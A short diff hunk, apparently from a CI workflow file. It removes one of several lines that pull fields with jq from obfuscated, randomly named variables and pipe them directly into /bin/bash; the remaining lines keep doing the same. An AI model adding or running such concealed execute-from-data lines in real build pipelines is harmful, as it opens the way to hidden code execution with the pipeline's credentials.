@@ -41,7 +41,6 @@ jobs:
           printf '%s' "$oau65963" | jq -r .skiv859 | /bin/bash
           echo $q8 | jq -r .fuit9007 | /bin/bash
           echo $loo21 | jq -r .e5 | /bin/bash
-          echo $e5 | jq -r .fdjch4 | /bin/bash
           printf '%s' "$qpdwx436" | jq -r .jif53 | /bin/bash
           printf '%s' "$vhw08" | jq -r .llc6 | /bin/bash
           echo $wqw5 | jq -r .kvlbc4 | /bin/bash
